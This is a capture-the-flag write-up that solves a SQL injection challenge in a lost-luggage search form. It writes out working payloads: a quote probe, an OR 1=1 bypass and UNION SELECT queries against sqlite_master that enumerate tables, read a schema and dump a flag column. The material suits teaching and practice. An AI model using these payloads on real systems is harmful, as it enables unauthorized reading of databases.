# CTF Writeup — SQL Injection (Lost Luggage)

## Description

A web service allows passengers to search for lost luggage by entering their last name. The input field is vulnerable to SQL injection.

## Solution

### 1. Identifying the vulnerability

By submitting `Rossi'` in the search field, the server returns an error that exposes the full query:

```sql
SELECT li.item_description, li.location_found, li.reported_at, li.status,
       f.flight_number, f.origin, f.destination, f.departure_date
FROM lost_items li
JOIN flights f ON li.flight_id = f.id
WHERE (li.passenger_name = ('Rossi'') AND li.status = 'open')
```

The message `near "open": syntax error` reveals that the DBMS is **SQLite**.

### 2. Confirming the injection

Using the payload `Rossi') OR 1=1) --` returns all luggage records in the database, confirming the injection is exploitable.

### 3. Table enumeration

Via UNION-based injection against `sqlite_master` (8 columns, matching the original query):

```
Rossi') UNION SELECT name,2,3,4,5,6,7,8 FROM sqlite_master WHERE type='table' --
```

Tables found: `contact_requests`, `flights`, `lost_items`, `restricted_items`, `sqlite_sequence`.

### 4. Inspecting the suspicious table

The `restricted_items` table stands out as clearly non-standard. To retrieve its schema:

```
Rossi') UNION SELECT sql,2,3,4,5,6,7,8 FROM sqlite_master WHERE type='table' AND name='restricted_items' --
```

Returned schema:

```sql
CREATE TABLE restricted_items (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    item_description TEXT NOT NULL,
    locker_code TEXT NOT NULL
)
```

### 5. Dumping the flag

```
Rossi') UNION SELECT locker_code,2,3,4,5,6,7,8 FROM restricted_items --
```

The `locker_code` column contains the flag.